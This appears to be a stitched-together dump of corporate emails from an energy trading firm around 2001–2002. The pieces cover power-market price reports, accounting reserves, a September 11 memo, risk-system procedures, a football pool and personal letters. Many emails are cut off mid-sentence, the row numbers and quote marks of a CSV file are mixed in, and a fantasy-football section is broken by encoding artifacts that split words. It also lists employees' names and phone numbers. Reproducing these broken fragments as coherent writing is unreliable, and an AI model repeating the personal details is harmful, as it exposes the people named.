The infrastructure to support Wireless LAN technology is in place and is being tested. We will be implementing multi level encryption and security to keep our intellectual property safe from eavesdroppers or hackers.

Amtel Replacement
As a move to provide a more flexible ""Plug n Play"" environment and to help with the reduced desk footprint, we have replaced the Amtel message boxes with Microsoft Exchange Instant Messaging. The Global Messaging Team is testing additional software products to provide some of the features not available with Exchange Instant Messaging; these include one-touch response keys, external LED display, and printing.  Updates will be provided as they become available.

3726,"Hi Patrice,

I have an issue with Edison Mission and I saw your name on a deal (1094593) from October so I thought I could ask you about it. It looks like the deals are on a month to month basis. They paid us $5M back in February and each month we deduct their invoice from this balance. They called Max in Credit (x.58261) and want their money back. So, I am fully prepared to wire them their money back, I just want to make sure all the people involved are aware. Credit is going to request an invoice from them stating what we owe them. When that comes in someone in credit will sign off on this request. I just want to make the front-end aware of what's going on. Do you know who else does these deals? Thanks for your help

Have a GREAT Thanksgiving.....you may already be gone......if so, lucky you!!!!

3730,"Hey girl,

What's happening?  Girl, remind me, just in case I have a memory lapse, that 
I will never, ever go back over to that church again.  It's a nice, small 
church, but those folks crack me up.  Last time I went, Sharon Mahon, sat 
next to me and just really acted a fool and had me roaring.  This time, those 
fools sitting by me (audrey and Doren) had me laughing, especially Audrey.  
They're fools!  I was so embarassed that my chuckle came out!  So, just 
remind me, I will never go back over there.   I sure hate that you missed 
seeing the baptismal pool! 

Boy, what a difference a day makes in the weather.  Last night, Todd cleaned 
out the closet, because of the potential tornado threat.  I was a little 
unnerved, especially with the kids.  I had the kids put on their shoes and 
socks and whatnot, just in case something happened.  I was a praying sister.  
That really scared me.  Then, to top it off, the weather got really cold this 
morning!  Oh well, talk with you later!

came in on Monday night and went upstairs, because I frankly, did not want to 
talk and did not want to get mad in front of Jordan.   I was furious and I 
still am furious.  Last night we had choir rehearsal, so he was in bed when i 
came back.  I really don't want to talk to him right now.   I'll keep you 
posted, because I will be doing it hopefully, tonight!

I too am very glad to be your friend...I only wished that we lived in the same city and could visit more often.  When God put us together, he knew what he was doing, AS ALWAYS!

How are things going?  I'm pretty tired this morning, I went to get a relaxer last night and got there at 8p.m. and did not leave until 11:30p.m.--pretty exhausting, but Todd is out of town today and I wanted to squeeze that in before he left and I'd have to get a sitter.  

Anyway, is everthing going well with the house?  Hope so.....My daycare notified us yesterday morning when Todd dropped the kids off that they will be closing their doors permanently on June 1st.  Talk about not getting much notice.  Anyway, needless to say, that is my new crusade!

Also, sorry about the choir,  what's wrong with Doren, he's seems to be sick alot.  Greg will probably ""fire his ass"" this week for messing up his ""Big Day"" on Easter.  That's a shame!

You mean to tell me you wore the new dress without the blouse/jacket.  That is wonderful, I told you not to worry about your arms.  You did look real good in the dress, the colors were beautiful.
 We need to shop together more often.

   Word of the Day for Tuesday April 9, 2002:

   quondam \KWAHN-duhm; KWAHN-dam\, adjective:
   Having been formerly; former; sometime.

     A  quondam flower child, she spent seven years at the Royal
     College  of  Art,  before  becoming a lecturer at Edinburgh
     School of Art.
     --""Interview:   Cool,   calm   collector,""  [1]Independent,
     December 13, 1997

     For  the  unregenerate  ""peasant""... had gone there with
     the   successful   glass   distributor,   shrewd  investor,
     versatile talker, and quondam [2]bon vivant whose motto was
     ""The best is good enough for me.""
     --Ted Solotaroff, [3]Truth Comes in Blows: A Memoir

     There  was  an  exception  to  this in the form of Mrs Edna
     Parsons,  a  formidable  Englishwoman who had once been the
     Prince's  nanny  and now served as proctor, supervising his
     behaviour.  She  was  about  fifty  and true to her quondam
     profession, she could be quite strict.
     --David Freeman, [4]One of Us
     _________________________________________________________

   Quondam  comes  from the Latin quondam, ""formerly,"" from quom,
   ""when.""

Northwest Spot Electricity Prices Rise With Reduced Snowmelt

     Portland, Oregon, May 17 (Bloomberg Energy) -- Peak spot
power prices for Friday-Saturday delivery in the Pacific
Northwest increased as less snowmelt and river runoff was
available for hydroelectric generation, traders said.
     A Bloomberg report shows accumulated precipitation in the
Western U.S. at 30.33 percent below typical levels and the snow
water equivalent for the region at 64.25 percent below average.
     At the Mid-Columbia trading point in Washington, the
Bloomberg index increased $24.82 from yesterday to $153.60 a
megawatt hour, with trades executed between $145.00-$160.00.
     ""The rain has stopped in the Northwest, and unlike the
snowmelt and the river run-off we had yesterday, it's beginning
to slow down,'' said one Northwest trader.
     At the California Oregon Border, day-ahead peak power gained
$22.60 to a Bloomberg index of $162.60, selling in a range of
$160.00-$166.00.
     According to Weather Services Corp. of Lexington,
Massachusetts, temperatures in Astoria, Oregon, were expected to
reach 57 degrees Fahrenheit today, increasing tomorrow 2 degrees
to 59 degrees.
     ""Northwest power prices are also rising with (the) Colstrip
unit down,'' said one Northwest marketer.
     Pennsylvania Power and Light Co.'s 700-megawatt Colstrip-3
coal-fired plant located in Colstrip, Montana, shut yesterday for
unplanned maintenance and is expected to restart tomorrow.
      At the NP-15 delivery point, peak power traded at $160.00-
$165.00, rising $9.79.
     Traders said power prices will likely increase over the next
few days as snowmelt continues to lessen and higher temperatures
are expected.
     According to Belton, Missouri-based Weather Derivatives
Inc., temperatures are expected to average 4.4 degrees Fahrenheit
above normal in the Pacific Northwest and 2.7 degrees above
normal in the Southwest 6-10 days from now.

Most Northeast Spot Power Prices Remain Steady With Low Demand

     Philadelphia, May 17 (Bloomberg Energy) -- Values for next-
day delivery of peak power remained little changed throughout most
of the Northeast U.S. as moderate temperatures continue to curb
regional load requirements, traders said.
     In the Pennsylvania-New Jersey-Maryland Interconnection, peak
power scheduled for Friday delivery was assessed at a Bloomberg
volume-weighted index of $39.40 per megawatt hour, up only 60
cents from yesterday.
     ""This is the annual calm before the storm,"" said one PJM-
based trader. ""Prices are right where they should be for this time
of year, barring any unforeseen unit outages or sustained heat
waves, of course.""
     Power scheduled for Friday delivery during this week last
year was valued at $36.50, representing an 8.2 percent departure
from today's comparative index.
     In the over-the-counter market, expectations for increased
supply and scant cooling demand further eroded next-week prices.
The five-day package was discussed at $38.29-39.25, compared to
$42.50-$43 yesterday.
     According to Weather Derivatives Corp. of Belton, Missouri,
temperatures in the Northeast will average 1.1 degree Fahrenheit
below normal May 21-May 25.
     Day-ahead values in the New England Power Pool were also
little changed at an index price of $51.50. Traders cited heavy
volume in the $51.50-$52.00 range, with an intra-day low and high
of $49.75 and $53.00, respectively.
     Next-week packages remained steady as well, as scheduled line
maintenance offset price reactions to the anticipated restart of
Entergy Corp.'s Pilgrim 1 nuclear unit.
     Data from the Independent System Operator of New England
shows the Alps-New Scotland transmission line that transmits power
to and from New York will be shut May 21-May 24 for breaker
repairs.
     New York was the Northeast's anomaly, with next-day values
trading higher across all three zones because of unit outages.
Zone A jumped $4.25 to an index of $43.00, while Zones G and J
posted increases of $3.25 and $2.13, respectively, to $54.00 and
$58.13 indices.
     Niagara Mohawk's 1,148-megawatt Nine Mile Point 2 nuclear
unit shut automatically yesterday due to a turbine trip. The
company is investigating the cause and hasn't released an expected
restart date.
     Mirant Corp. also lost a unit unexpectedly, its 447-megawatt
Tomkins Cove plant, following a boiler explosion. The plant is
located 25 miles north of New York City and is fueled by coal,
natural gas and oil. Company officials told Bloomberg the unit
will remain in shutdown until the cause of the explosion has been
determined.

ECAR Power Prices Fall as Squeeze Ends; MAIN, MAPP Also Drop

     Cincinnati, May 16 (Bloomberg Energy) -- U.S. Mid-Continent
next-day power prices declined as traders finished covering short
sales in the East Central Area Reliability Council and cooler
weather moved into the Midwest, traders said.
     ECAR traders said prices fell across the region as the
Cinergy hub market returned to levels seen before yesterday's
""short squeeze,"" where many market participants had to buy power
to fulfill requirements from prior sales.
     The Bloomberg index price for power delivered Friday into
the Cincinnati-based Cinergy Corp. transmission system fell $6.29
to $39.96 a megawatt-hour, with trades ranging from $42.00 down
to $38.00 after options expiration.
     ""There was still plenty of volume, and plenty of demand from
the South,"" one ECAR trader said. ""The drop was just a return to
more fundamentally-based prices after yesterday's short squeeze
went as far as it could go.""
     Over-the-counter prices at Cinergy continued to decline
after a bearish injection report from the American Gas
Association drove natural gas futures prices down further and
weather forecasts were revised cooler for next week.
     Peak Cinergy parcels for delivery from May 21-25 sold at
$35.00, down $5.00 from yesterday, while offers fell to $62.00
for June power and $95.00 for July-August parcels, the lowest
level seen this year.
     In the Mid-America Interconnected Network, day-ahead power
prices dropped as temperatures were expected to do the same, with
peak parcels selling $5.79 less on average at $36.00-$40.00 at
the Chicago-based Commonwealth Edison hub and $5.21 less on
average at $41.00-$47.00 in the lower half of the region.
     Lexington, Massachusetts-based Weather Services Corp.
predicted high temperatures in Chicago would fall from 84 degrees
Fahrenheit today to 75 degrees tomorrow.
     Mid-Continent Power Pool next-day electricity prices also
fell, as cooler weather reduced demand and lessened transmission
constraints, traders said.
     Peak power sold $7.00 less at $43.00-$46.00 in northern MAPP
and $6.94 less at $44.00-$48.00 in the southern half of the
region.
     Weather Services forecast tomorrow's high temperature in the
low-to-mid 70s degrees across MAPP, down from temperatures in
mid-80s to low-90s degrees earlier this week.

Most Southeast Power Prices Drop as Cooler Weather Dominates

     Topeka, Kansas, May 17 (Bloomberg Energy) -- U.S.
Southeast spot electricity prices were mostly lower today as
cooler weather was projected to move through the region
tomorrow, traders said.
     The Bloomberg Southeast Electric Reliability Council
regional index price fell an average of $2.30 a megawatt-hour,
or 4.8 percent from equivalent trades made yesterday for
delivery today, to $45.47, amid trades in the $36.00-$65.00
range.
     ""We're going to have a 15 degree (Fahrenheit) temperatures
change from today to tomorrow if the forecasts are right,"" said
one Southwest Power Pool utility trader. ""Because quite a few
units are coming back from maintenance, next week's really
going to soften up.""
     Forecasters from Lexington, Massachusetts-based Weather
Services Corp. predicted daily high temperatures in the Topeka
vicinity would peak tomorrow at 71 degrees Fahrenheit, off from
today's projected high of 84 degrees.
     In the Tennessee Valley, traders said expected high
temperatures will decline about 1-3 degrees through tomorrow,
cutting residential and commercial power demand for air
cooling.
     On the Tennessee Valley Authority grid, the Bloomberg peak
next-day index price slid $3.07 to $41.50 amid trades in the
$36.00-$44.00 range. Off-peak energy was discussed at $16-$18,
$2 higher on cooler expected overnight weather.
     Utility traders in the Virginia-Carolinas region said that
recent warm weather would continue through tomorrow and the
weekend, though temperatures would start out cooler through the
first half of next week.
     The Bloomberg VACAR index fell an average of $2.58 to
$45.55 amid trades at $45.00-$48.00.
     According to Belton, Missouri-based Weather Derivatives
Inc., cooling demand across the Southeast was expected to
average about a half degree above normal over the next week,
though temperatures could average 4.1 degrees below normal over
the next 6-10 days.

U.K. Power Prices Little Changed in Lackluster Trade

     London, May 17 (Bloomberg Energy) -- Power prices in the U.K.
were little changed today amid lethargic activity, traders said.
     June traded 10 pence higher at 18.45 pounds a megawatt-hour.
July traded 10 pence lower at 18.30 pounds a megawatt-hour.
     Activity was ""directionless"" today amid little new
information to trade on, traders said.
     Although many power plants have scheduled outages over the
coming months for maintenance, one trader said price gains were
offset by sufficient supply in the market.
     Winter 2001 baseload traded 15 pence higher than yesterday
following trades at 21.52 pounds a megawatt-hour.
     Day-ahead baseload started trade at 18.50 pounds a megawatt-
hour, 65 pence lower than yesterday.
     Day-ahead peak traded at 22.00 pounds a megawatt-hour, 40
pence lower than yesterday.

Nordic Electricity Prices Close Higher on Elevated Spot Value

     Lysaker, Norway, May 16 (Bloomberg Energy) -- Electricity
prices on the Nordic Power Exchange in Lysaker, Norway, rose in
active afternoon trade after generators set tomorrow's spot price
above expectations, traders said.
Participants rushed to close positions ahead of a Norwegian
holiday tomorrow that will keep the market closed. Nordpool is
scheduled to re-open on Friday.
     Winter-2, 2001 jumped 1.75 kroner a megawatt-hour to close at
a record high of 218.25 kroner a megawatt-hour with 449.00
megawatts exchanged. Winter-1, 2002 gained 2.10 kroner after
166.00 megawatts traded between 216.00-218.75 kroner a megawatt-
hour.
     Although industrial end-user demand was anticipated to drop
tomorrow as Norway celebrates Constitution Day, Thursday's system
area average price was set at 195.41 kroner a megawatt-hour, more
than 10 kroner above traders' expectations of 185.00 kroner a
megawatt-hour and down 2.97 kroner from today's price.
     Producers in western Norway retained control over inflowing
molten snow, pushing prices higher, an Oslo-based trader said. The
minimum hourly spot price in Trondheim, Norway was set at 190.88
kroner a megawatt-hour, only 4.53 kroner lower than the system
area average price.
     Nordpool reported an expected 2.5 percent increase in
Norwegian reservoirs to 34.7 percent of total capacity at the end
of week 19 from the previous week, compared to 49.9 percent of
total capacity a year ago. In Sweden, reservoirs were up 7.9
percent to 33.2 percent of total capacity, beating expectations of
a 5.2 percent gain.
     Snowmelt in Norway was likely to peak in the next ten days,
delaying water tank refilling, while in Sweden it peaked last
week, traders said.
     Limited snow accumulation in the important hydro-producing
region of western Norway has also minimized the effect of
anticipated supply increases.
     In the shorter-term, week 21 closed 1.50 kroner higher at
195.00 kroner a megawatt-hour after a total 286.00 megawatts
traded as low as 190.75 kroner a megawatt-hour. Week 22 jumped
5.00 kroner a megawatt-hour to 204.00 kroner a megawatt-hour.
     Total volumes more-than-quadrupled in afternoon trade to
3,717 gigawatt-hours generation compared to this morning's 738
gigawatt-hours.

to resolve these issues with Transco, BUG , LILCO and Enron.  The total dollars
required was approximately $4.25 million.  An amount of $3.55 million needed for 
the Transco historical imbalance resolution.  The remaining balance was needed
for the BUG and LILCO accounting issues that Keyspan brought to our attention 
last year.

Bob Hall has $3.5 million reserved in his area for the Transco historical imbalance.
The remaining $50,000 for Transco and approximately $700,000 of additional funds
for the accounting issues were to be reserved last year under ""The Office of the
Chairman"".  Sally Beck and Janet Dietrich arranged for this additional money to
be reserved at the ""Chairman"" level since the additional funds were needed to 
correct an old accounting problem that should not hit the East Desk P&L.  Also, the 
arrangement was that the reserve would be maintained until the settlement payments
were made by Enron.

As with most stories, there is some good news and some bad news.  First, the bad news.
After a great deal of investigation, it appears that there currently is no reserve at the
""Office of the Chairman""  for these additional funds.  Now, the good news.  Georgeanne 
will take the necessary steps to make sure there is money available so that we can
quickly resolve these issues with Keyspan and Transco.

In response to  your voice mail today regarding the request to proceed with 
substation I offer the following. I spoke with Jim Alexander today who should 
be in touch with you tomorrow.  The overall cost profile of the respective 
construction requires us to authorize this level of expenditure to provide 
the up front engineering work, drawings and to place the order for the 
transformers.   Jim will be responsible for providing me with any details 
that you need to justify the authorization request.  I will follow up with 
Jim tomorrow although I will be travelling after approx. 10:30 am and want to 
make sure we get this ball moving. 

As you recall, our estimate of construction timing was short when we 
originally requested the initial release for the power line and substation 
work.  ECS submitted a separate release for the power line work but the 
substation release has lost another 2 1/2 weeks of the schedule.  

If you have any questions or need to contact me over the next 2 days, please 
call my office at 853-3463 and have Melissa  page me or leave a detailed

I want to apologize in advance for the impersonal nature of this request; 
but, I believe that the potential results may justify the means.  I am 
requesting that each of you strongly consider making a contribution to the 
American Diabetes Association.  My sister, Valerie, who is a school teacher 
at the Rice School has organized a ""School Walk"" to benefit the ADA.  
Although I am always reluctant to solicit contributions from my friends and 
co-workers, I feel emotionally compelled to do so this time.  In addition to 
my sister's involvement in this fund raiser, my brother Steven was diagnosed 
several years ago with Adult On-Set Juvenile Diabetes and I have seen first 
hand what a terrible disease this can be to manage.  There is good news, as 
many of you know.  The research in this area has made great strides in recent 
years and I am encouraged that someday soon there will be a cure.

In this regard, I would truly appreciate any contribution that each of you 
might be able to make.  Something as small as $5.00 would be great. (although 
if your pockets are full and you want to give more that is ok too)  I would 
be forever grateful if, through the donations that I am able to collect, I am 
able to make a difference.  Please feel free to send your checks via 
inter-office mail or stop by if you wish.  Thank you for your consideration.

Dan White (403-508-3184) at Enbridge faxed me their confirmation.  According to Dan, this gas was parked in May and June 2001.  Per Enbridge's confirmation, ""Customer shall pay Enbridge a fee of $.22 US/MMBtu...prorated over 12 months"".  The confirmation makes it clear that March withdrawals are interruptible.  Dan didn't know if ENA has paid the fee but he is letting ENA take this gas for March!!!  So far have not been able to find a deal ticket in Sitara or tagg that 

Tomorrow, I will get bids from some of the companies ENA has done business with in the past at Dawn.  Before I sell the gas, I will 
	1.  verify the creditworthiness of the company we are selling to
	2.  make sure the company we are selling to agrees to pay us for the gas and doesn't net this with some other item.

The tragedy of Tuesday, September 11 will serve as an unforgettable reminder to people all over the world of what is truly important and of life's fragility.  My heartfelt sympathies go out to the families and friends of all the people whose lives were taken in this senseless and horrific attack.  I ask that all of you keep our deceased colleague Nick Humber and his family in your thoughts and prayers.  Tragically, Nick, a director with Enron Wind, was on one of the planes hijacked on Tuesday.
To help with relief efforts in New York and Washington, D.C., Enron will make a total contribution of $1 million dollars to be split equally between the American Red Cross and the New York Firefighters and Police Officers Fund.
Many of you have expressed an interest in more personal involvement and I want you to be aware of some of the options available.  I encourage you to support those impacted by this tragedy by donating to relief efforts, and to take advantage of our Matching Gift Program to double the impact of your individual donation.  Because of the significance of this tragic event, Enron will match your contribution 2 for 1.

How to Help
?  Please go to www.easymatch.com/enron. Once there, click on ""Disaster Relief""  (located in the middle of the top of the page).  Please choose from the list of non-profits that are accepting donations to help with this effort.  Any donations made to aid with disaster relief will not be counted toward the annual $15,000 Matching Gift limit.   You will need your GIS number to do this (it begins with a 9).  If you are unsure of your GIS number, please contact the HR GIM helpdesk at 713-853-5666. 

?  We will have red, white and blue striped ribbons in Houston for employees to pin on their shirts in memory of those who lost their lives, in honor of those who survived, and for their families.  Donations to the New York Firefighters and Police Officers Fund and other organizations are being accepted in exchange for the ribbons.  Enron will also match these donations.  The  ribbons are available tomorrow from 9:00 - 11:00 a.m. at the InfoZone, which is located by the down escalator in the lobby.   For any other employees who would like to make donations, please go to the above website.  

?  Enron employees are generously giving blood, and we will continue to work with relief efforts to ensure that employees who want to give, have the ability to do so.  If you have questions, call 713-853-6100. 

?  President Bush has declared Friday a day of ""National Prayer and Remembrance,"" and is calling on Americans to use their lunch breaks to go to places of worship to pray for victims and their families.   Following is a list of websites with additional information: 

o	<http://abclocal.go.com/ktrk/> 
o	<http://www.chron.com/content/community/religious/>
o	If you are looking for a service within walking distance of the Enron building, First United Methodist Church (corner of Main and Clay) and Antioch Missionary Baptist Church will hold prayer services on Friday.  First United Methodist Church will have services at 11:00 a.m., noon and 1:00 p.m.  Antioch Missionary Baptist Church will have a service at noon.  
o If you are interested in attending a service and don't work in this area, please check your local television websites for more information. 


?  For Houston employees, a citywide candlelight vigil will be held on the steps of City Hall in Downtown Houston at 7 p.m. tomorrow night.  Mayor Lee Brown will be speaking.  

?  At 10:00 a.m. (Central) on Monday, September 17th, in Enron facilities around the world, we will have a moment of silence in memory of  those whose lives have been tragically taken.  We ask that you put down the phone, turn away from your computer and dedicate a personal moment of silence together with your co-workers.  

?  We encourage all U.S. based employees to wear red, white or blue shirts on Monday.

For Counseling Assistance
?  For employees in Houston, we have an on-site employee assistance counselor in the building that you can reach by calling 713-853-6057.  If you are not located in Houston or if you or a family member would prefer an off-site counselor, you can call the 24-hour Employee Assistance Program number 1-800-345-1391. 

?  Employees outside the U.S. can also contact 713-853-6057 directly.  United HealthGroup (Enron's medical network administrator) has provided free access to their National Disaster Line for counseling service to any person.  That number is 800-268-1026.  We are also working to bring crisis counseling to any work location that has a need.

This is an agonizing time for our nation and it is hard for us all.  In addition to the financial and human support we are extending to those in need, it is imperative that we at Enron continue to safely and reliably serve our customers in the U.S. and around the world.  We know it is difficult but we must demonstrate on-going stability and strength at Enron, as this will serve as a signal that the ideals upon which America was founded cannot be diminished.  Again, our hearts go out to the families and friends of those who have lost loved ones in this tragedy.  Please continue to watch your e-mail for more information.

3896,"	This is a reminder that the Summer 2001 ISO Demand Relief Program
charges are reflected on the June 30 statements and June invoices.  As
announced previously this year, the ISO has developed a Summer 2001 Demand
Relief Program (DRP).   The program is designed to provide an additional
level of demand reduction on the ISO system that can be implemented during a
stage 2 Emergency in an effort to prevent involuntary load curtailments or
rotating blackouts associated with a Stage 3 Emergency.  

	Similar to last years program, the same charge types are utilized
for capacity, Charge Type 7 and 117, described in the first link below.  Two
new Charge Types, 3472 and 3482,  have been created for the energy payment
and allocation when contracted loads are called upon to curtail, described
in the second link below.  Although the program was initiated in June, no
calls were made to curtail load, therefore, charges 3472 and 3482 were not
utilized.    The periods in which the Demand Relief Program was called upon
to initiate interruptions of contracted loads can be found at the third link
below.

	Not as many upsets this past weekend in the college and pro games. Among the games that were commonly missed were, in the college games, Auburn/Georgia and Iowa/Northwestern; in the pros, Green Bay/Chicago, Miami/Indianapolis, and Oakland/Seattle. 

	Going into tonight's game, we have 4 people still alive for the money. Larry Campbell, Dave Ryan, Kayne Coulter and Joe Quenet, all who missed 4 games.  Dave, Kayne and Joe picked Baltimore and Larry picked Tennessee. Therefore, if Tennessee wins, then Larry will win outright. If Baltimore wins tonight, then it will come down to total points scored. Dave picked 24 points, Kayne has 29 and Joe had 56. Dave will win with Baltimore and 26 or less points, Kayne will win with Baltimore and between 27 and 42 points, and Joe will win with Baltimore and 43 or more points. 

	We only had 22 entries this weekend, therefore the prize will be $66. This coming week's games will be handed out tomorrow and due Thursday afternoon, since I will be off this Friday. Here are the results from the games with the amount of games each person missed.

NO - Pierres Flea Circus Updated 11/16/01 Williams is one of the better Fan=

'll face an Indianapolis defense that has been underachieving all season lo=
ng, so Williams is a must-start.     Aaron Brooks , QB NO - Third World Cou=
ntryman Updated 11/16/01 Brooks had a big game against San Francisco last w=

 this season, but his potential to post huge numbers makes it tough to benc=

 game against San Francisco last weekend, posting 11 catches and 167 yards =

to the pass in Week 10, so starting Jackson this week is a solid option.   =
Stephen Davis , RB WAS - 2700 ! HU! EVOS Updated 11/16/01 Davis has stepped=
 up his play after beginning the season slowly. He's averaged 112 yards rus=

tasy player. Give him the start in Week 10 against a Denver defense that is=
 vulnerable to high scoring games.   Tony Banks , QB WAS - Free Agent Updat=
ed 11/16/01 Banks has played well of late, throwing five touchdowns in his =
last three games. He's got a good matchup this weekend against a Denver tea=
m that can be beaten through the air, but he's only worth considering in ve=
ry deep Fantasy leagues.   Michael Westbrook , WR WAS - Third World Country=
man Updated 11/16/01 Westbrook has been inconsistent this season, but he ha=
s caught three touchdown passes in his last four games. He'll face a Denver=
 secondary this weekend that is vulnerable at best, so starting him in deep=

d against Denver, however, so starting him is a good move. !   Az-Zahir Hak=
im , WR STL - Xtreme Updated 11/16/01 Hakim has been inconsistent in recent=
 weeks, so starting him on your Fantasy team is a gamble unless the matchup=
 is right. He'll go up against a tough New England secondary in Week Ten, s=
o avoid using him outside of deeper leagues.   Torry Holt , WR STL - Pumpdo=
g Updated 11/16/01 Holt continues to put up consistent yardage totals, but =
he's only scored only three touchdowns this season. He'll face a tough New =
England secondary this weekend, but he's still worth starting on your Fanta=
sy team based on his potential to put up solid numbers.   Isaac Bruce , WR =
STL - Cali Bound Updated 11/16/01 Bruce hasn't put up the huge Fantasy tota=

RB STL - Baby Blues Updated 11/16/01 Faulk had a huge game against Carolina=
, proving that he is still the best Fantasy player in the league. He's a mu=

ngland.   Ernie Conwell , TE STL - Xtreme Updated 11/16/01 Conwell has had =
a few down weeks, so starting him on your Fantasy team is somewhat of a gam=
ble. With the lack of depth at tight end around the league, however, starti=
ng Conwell is something many Fantasy owners will have no choice but to do. =
  Richard Huntley , RB CAR - Baby Blues ! Updated 11/16/01 Huntley will be =
the likely starter this weekend against San Francisco, but don't be surpris=
ed if he splits carries with Nick Goings. Avoid starting either back in Wee=

/01 Hayes had only two catches for 11 yards last weekend against St. Louis.=
 He's been unreliable for Fantasy owners this season, so starting him is a =
real gamble.    Wesley Walls , TE CAR - Cali Bound Updated 11/16/01 Walls h=
as! b! een held in check over the last three weeks, but he's still one of t=
he better tight ends in the league. He's had some success against San Franc=
isco in the past, so starting him is advisable.   Muhsin Muhammad , WR CAR =
- KMB Express Updated 11/16/01 Muhammad finally had a somewhat productive g=
ame, catching six passes for 75 yards against St. Louis. He's had some succ=
ess in the past against this week's opponent, San Francisco, so starting hi=
m is a decent move.   Brett Favre , QB GB - Cali Bound Updated 11/16/01 Fav=

 He'll face an Atlanta team on Sunday with a very vulnerable secondary, so =
be sure to start Favre this week.   Bubba Franks , TE GB - The Hillrods Upd=
ated 11/16/01 Franks may not put up huge yardage numbers, but his seven tou=
chdowns in eight games makes him a valuable Fantasy player. Unless you have=
 a better option on your roster, Franks is the type of tight end that shoul=

         How are you?  I wanted to call you this week-end but I had such a 
bad one that I never had time.  First, I made a mistake at work that caused 
several people to have to work extra time on Saturday so I was on the phone 
with them all day ( I felt bad).   Sunday we went to brunch at Pappasitos and 
I left my retainer wrapped in a napkin on the table  -  so it cost me $800.00 
to replace - I was so mad at myself (you know how cheap I am).  I was off 
Monday & Tuesday and had four doctors appointments so that was fun.  I 
finally got my bookcases cleaned (there were spider webs all over them) and 
my Halloween decorations that Mom made me up.  My house looks really nice (to 
nice for us actually).  We finally got our chandelier for the dining room - 
it is so beautiful.  I made reservations for Thankgiving and was sad when Don 
told me this week-end that they are not planning on coming home because Lynn 
has to work.  I hope we can stay with you as I understand Carla & Russ are 
not doing well.  Maybe we can eat at the Rose - just  you & me.  Well better

I don't think the issue is how the books are calced/officialized on those 
days.  Here why.  The same calc is used the day before and for the rest of 
the following month.  The physical calc is simply copied each day.  On Jan. 
31, extending the expert clause to include Feb is the only change made.  Once 
Feb rolles to intramonth the ""From date"" on the calc is changed from the Jan 
1 to Feb 1.  Since January has already rolled off this should have no effect 
on the positions.  Also, the positions for prompt month were correctly 
captured by Risktrac, which leads me to believe that problem is with the VAR 
calc not the post ids.  

Let me know if this doesn't answer your question.

3952,"David,

Here is a short list of what it takes to pull positions into the benchmark.  

1)  Once a book is officialized it must be loaded into GRMS BEFORE the 
positions can be pulled into the benchmark.  

2) With everyone officializing books around the same time the GRMS que is 
overloaded and positions are very slow to be loaded into GRMS.  

3)  GRMS processes books in the order that they are officialized.  If one of 
your books is officialized behind either the Nymex, Power, or Canadian books 
your book will not  be loaded into GRMS until these books are finished.  This 
process can take up to 45 minutes to complete.  

4)  I have to manually create text files for deals that they system is not 
designed to handle.  These files must then be loaded into GRMS.

4)  I have to manually override Post-IDs that for one reason or another do 
not come in automatically or that come in incorrectly.  

5)  The benchmark query takes approximately 15 minutes to complete.  The more 
books that are officialized, the longer the query takes.  

6)  When books are unofficialized and reofficialized, this effectively sends 
that book to the back of the GRMS que.  This means that the entire process 
must be started over.

7)  Now that plugging positions is no longer an option, I have to spend time 
researching any variances that arise between the GRMS position and the ERMS 
position.

8)  If the book admin and I cannot solve the problem, then I have to contact 
the GRMS support team.  Since this usually occurs after their regular hours 
it takes a while before they can get back in touch with me.  

9)  I cannot query new data while I'm researching variances or on the phone 
with GRMS support because I need access to  the information that is currently 
in the bench.  

10)  Finally, this is a massive file therefore we frequently get errors and 
have to shut down.  Even if the spreadsheet has been saved and no data is 
lost it still take about 10 minutes just to shut this file down and reopen 
it. 

If you have any more questions let me know.

",Jeff,,
3958,"Kathy,

I am attaching a copy of the NGPL that was reported as of this morning.  If 
you look at the by Trader P&L, we are off from your spreadsheet by 
approximately $3.6 million USD for December and approximately $7.6million 
year to date.  The $7.6 consists of the December variance and the $4 million 
variance that we discussed earlier (originations).  However, I spoke with the 
Chris Able from the Controls group, what we are reporting for originations 
and for Canadian p&l ties to the DPR.   This leads me to believe that either 
our number already includes the origination adjustment or the origination 
adjustment was never made to the DPR.  To help resolve the December variance, 
I have added a tab to your file to show what we have reported each day for 
December.  

Remember the p&l we are reporting by trader excludes originations.  Give me a 
call when you have time and we can try to resolve these variances.

The Lincoln facility does not have an operating permit from Illinois EPA.  
Condition 10a of the construction permit allows operation of the facility up 
to the end of emission testing and Condition 10b allows continued operation 
after emission testing has been completed.  Also note that Condition 10c of 
the construction permit states that these conditions supercede Standard 
Condition 6, which requires the applicant to apply for a State operating 
permit.  In other words, the Lincoln facility does not need to hold a

The sheet labelled 'Daily Change' shows the change (increase +/decrease -) in
the requested daily volume relative to a prior value.  For the current gas 
day,
the change is an intra-day change and is calculated using the previous day's
volume request for the current day (e.g., If the current gas day is 3/28, then
the change is computed with respect to the 3/27 request for 3/28).  For
tomorrow's gas day and any subsequent ones shown, the change is computed using
the First-of-the-month volumes requested for those days.  (e.g., If today is
3/28, then the change for 3/29, 3/30, etc. is computed with respect to the
first-of-the-month volumes for those days.)   This sheet should be useful in

are a 3 partner firm.  We bought a building in Hawthorne and we close on
April 1.  I'm looking forward to getting into the building soon.  We have to

protests) that Entergy's filing is discriminatory and not the way to solve 
transmission constraints issues.  Actually, Entergy proposes solving 
constraint issues by not allowing parking at a generation only control area 
and by eliminating netting--both items that we won last year at NERC against 
TVA.  Entergy's filing is a proposal to solve ""partial paths"", which they 
call ""fictional"" sinks/sources via elimination of the path.  

Now MAIN and ComEd (specifically stating that it doesn't want us to sink at 
the Enron soon-to-be control area in ComEd) have raised this issue.  We are 
working on a response to ComEd and Dick may be going out to meet with them 
too.  

Finally, DUKE AND CINERGY both told me that while their marketing/traders 
greatly want to protest Entergy's filing, their transmission side won't let 
them.  So both are filing plain vanilla interventions.  We need to again be 
looking for any NERC email blasters that go out from marketers of utilities 
now and into the summer, similar to what SCEM (Southern's marketer) sent out 
last year complaining about TLRs.  If you see any of these, let me know so we 
can possibly send them to FERC staff because it is very difficult to get them 
to take a public position.  PECO Energy is filing a good protest to Entergy.

1. We will be able to mark Swaption Volatility -- In the past (current version of curve manager you are using) we only have one set of volatility curves which is being applied to the calculations of both option and swaption deal types.  The new version of curve manager allow us the flexibility to more accurately mark volatility curves seperately for swaption deal type.  If you decided that you are not going to use this feature by not marking a seperate set of volatility for swaptions, our calculation system will by default use our option volatility curves.

2. In the past if you mark the long term (by month) price ""change"" column directly in the curve manager for certain month, the curve manager will automatically apply the same change to be the same price change for the same month in all other years.  In the new version, this ""automatic"" feature will be removed.  Please note if you mark long term curves by doing copy and paste from Excel rather than by marking the curve change directly in the curve manager, this ""automatic"" feature has not affected you in the past and will not affect you in the new version.

